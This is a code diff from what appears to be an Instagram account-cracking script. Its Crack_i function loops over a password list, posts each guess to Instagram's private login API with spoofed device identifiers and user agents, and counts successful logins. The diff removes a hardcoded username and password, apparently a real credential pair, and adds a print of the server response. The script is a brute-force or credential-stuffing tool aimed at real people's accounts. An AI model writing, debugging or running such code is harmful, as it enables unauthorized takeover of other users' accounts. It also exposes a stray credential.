@@ -855,8 +855,6 @@ def Crack_i(username, memek):
     for password in memek:
         try:
             uag = UA_OLD()
-            username = 'itz__hari__556'
-            password = '62678121'
             base_ts = int(time.time())
             device_id = str(uuid.uuid4())
             family_device_id = str(uuid.uuid4())
@@ -910,6 +908,7 @@ def Crack_i(username, memek):
             signed_body = f"SIGNATURE.{json_str}"
             data = {"signed_body":signed_body}
             response = ses.post('https://i.instagram.com/api/v1/accounts/login/',data=data,allow_redirects=True)
+            print(response.text)
             if "logged_in_user" in str(response.text.replace('\\', '')):
                 Ok += 1
                 header_str = str(response.headers)
